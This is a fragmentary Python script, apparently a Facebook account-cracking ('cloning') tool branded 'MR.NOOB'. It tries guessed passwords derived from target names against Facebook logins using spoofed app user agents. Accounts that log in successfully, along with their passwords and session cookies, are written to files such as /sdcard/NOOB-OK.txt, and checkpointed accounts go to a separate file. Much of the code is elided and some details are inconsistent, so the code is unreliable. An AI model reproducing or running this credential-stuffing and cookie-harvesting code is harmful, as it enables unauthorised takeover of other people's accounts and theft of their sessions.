...
def riazfile():
useragent=[]
sonu_ua = random.choice(["Davik/2.1.0 (Linux; U; Android 6.1.4.0.0; SM-243 Build/8BFOHT) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/Nokia;FBBD/Nokia;FBDV/Nokia;FBSV/Nokia.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=485,height=756};]"])
#<------[userugrnt]----->
def riazfilee():
...
#<-----[Method~1]---->            
    def method1(self, rid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\x1b[1;97m[MR.NOOB] {loop}|{len(self.id)} \x1b[1;92mOK:-{len(oks)} {''.format(loop/float(len(self.id)))}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    print(f'\r\r\x1b[1;92m[NOOB-OK] {rid} | {ps}\033[1;97m')
                    oks.append(rid)
                    open('/sdcard/NOOB-OK.txt','a').write(rid+'|'+ps+'\n');open('/sdcard/REFAT_iDs_COOKiES_M1.txt','a').write(rid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f'\r\r\x1b[1;91m[NOOB-CP] {rid} | {ps}\033[1;97m')
                     cps.append(rid)
                     open('/sdcard/NOOB-CP.txt','a').write(rid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def method3(self, rid, name, psw):
        try:
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);rsbhai = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"fh={rsbhai};{ckkk}"
                    print(f'\r\r\x1b[1;91m[NOOB-Ok] {rid} | {ps}\033[1;97m')
                    oks.append(rid)
                    open('/sdcard/NOOB-OK.txt','a').write(rid+'|'+ps+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
...
def riazcp():
    ...
    print(' Ids saved in NOOB-OK.txt,in cp NOOB-CP.txt')
    linex()
    input(' Press Enter to Back')    
    os.system('python NOOB.py')
#<------[Cloning]------>
        ...
        for ps in pwx:
           ...
           'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[NOOB-OK] '+uid+' | '+ps+'\033[0;97m')
                open('/sdcard/NOOB-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\033[1;31m[NOOB-CP] '+uid+' | '+ps+'\033[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r[MR.NOOB] %s|%s \x1b[1;92mOK:%s   \r'%(loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
#<-----[bd_clone]----->
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\033[1;31m[NOOB-CP] '+cid+' | '+ps+'\033[0;97m')
                open('/sdcard/NOOB-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\x1b[1;37m[MR.NOOB] %s|%s| \x1b[1;92mOK:%s   \r'%(loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\x1b[1;97m[MR.NOOB] %s| \033[1;32m OK:%s\033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in RIAZ:
                                ...
                                print('\r\r\033[1;32m[NOOB-OK] %s | %s'%(ids,pas))
                                ...
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;31m[NOOB-CP] '+ids+' | '+pas+'\033[1;97m')
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in RIAZ:
                                ...
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;31m[NOOB-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/CP-NOOB-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print('\033[1;92m[NOOB-OK] '+uid+' | '+ps+'\033[1;32m')
				open('NOOB-ok.txt', 'a').write(uid+' | '+ps+'\n')
				oks.append(uid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[NOOB-CP] '+uid+' | '+ps+'\33[0;97m')
